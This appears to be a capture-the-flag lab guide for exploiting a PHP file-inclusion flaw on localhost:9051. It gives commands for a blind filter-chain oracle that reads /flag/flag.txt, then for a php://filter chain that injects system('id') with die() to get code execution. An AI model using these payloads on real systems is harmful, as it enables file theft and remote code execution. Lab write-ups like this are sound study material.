# How to Use `php_filter_chains_oracle_exploit`

**IMPORTANT:** There are TWO tools.
1.  `php_filter_chain_generator`: Generates RCE payloads. (NOT for blind file reading).
2.  `php_filter_chains_oracle_exploit`: Run the Blind Oracle attack. **USE THIS ONE.**

## 1. Setup
```bash
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit.git
cd php_filter_chains_oracle_exploit
pip3 install -r requirements.txt
```

## 2. Using the Tool against Localhost:9051

The command to read `/flag/flag.txt` from your container:

```bash
python3 filters_chain_oracle_exploit.py \
    --target "http://localhost:9051/index.php" \
    --parameter "page" \
    --file "/flag/flag.txt"
```

## 3. What to Expect
1.  **Fingerprinting:** The tool might first send some probes to determine if the server is vulnerable to the oracle (checking if "Size Bomb" causes timeout).
2.  **Extraction:** It will start printing characters one by one.
    *   `[+] Found char: f`
    *   `[+] Found char: l`
    *   `...`
3.  **Completion:** `[+] File content: flag-arbyci`

## 4. Troubleshooting
*   **Docker Networking:** Ensure you are running this from a machine that can reach `localhost:9051`.

---

# PART 2: Achieving RCE (Remote Code Execution)

To get a shell or run commands like `id`, you use the **OTHER** tool: `php_filter_chain_generator`.

## 1. Setup
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator.git
cd php_filter_chain_generator
```

## 2. Generating the Payload
We want to inject PHP code.
**Critical:** Because the server uses output buffering (`ob_clean`), we must terminate execution (`die()`) to force our output to be sent immediately.

```bash
# Generate a chain that executes 'id'
python3 php_filter_chain_generator.py --chain "<?php system('id'); die(); ?>"
```

## 3. Explaining the Output
The tool will output a massive string starting with `php://filter/...`.
Copy this entire string and send it as the `page` parameter.

```python
# Example Usage
import requests
payload = "php://filter/convert.iconv.UTF8.CSISO2022KR|..." # Paste huge string here
requests.post("http://localhost:9051/index.php", data={'page': payload})
```

## 4. Why `die()`?
If you just used `system('id')`, the output would be captured in the buffer:
```php
ob_start();
include($file); // 'id' runs, output goes to buffer
ob_end_clean(); // Buffer IS DELETED. You see nothing.
```
By adding `die();`, the script ends *inside* the include, causing PHP to flush all buffers to the browser immediately, identifying the exploit.

